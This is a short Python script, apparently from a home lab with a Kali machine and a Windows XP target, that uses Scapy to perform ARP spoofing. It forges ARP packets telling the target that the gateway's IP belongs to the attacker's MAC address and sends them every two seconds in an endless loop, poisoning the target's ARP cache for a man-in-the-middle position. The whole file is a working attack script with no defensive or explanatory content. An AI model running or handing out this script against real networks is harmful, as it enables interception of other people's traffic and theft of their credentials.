# encoding: utf-8
# sudo python3 arp_scapy.py

from scapy.all import *

# ip
target_ip = "192.168.80.139" # winxp ip
loacal_ip = "192.168.80.138" # kali ip
gateway_ip = "192.168.80.2"

# mac
target_mac = getmacbyip(target_ip)
loacal_mac = get_if_hwaddr("eth0")
gateway_mac = getmacbyip(gateway_ip)

# connect
pack =Ether(dst = target_mac, src = loacal_mac)/ARP(op = 1, hwsrc = loacal_mac,
psrc = gateway_ip, hwdst = target_mac, pdst = target_ip)

# send package
while 1: sendp(pack, inter = 2, iface = "eth0")
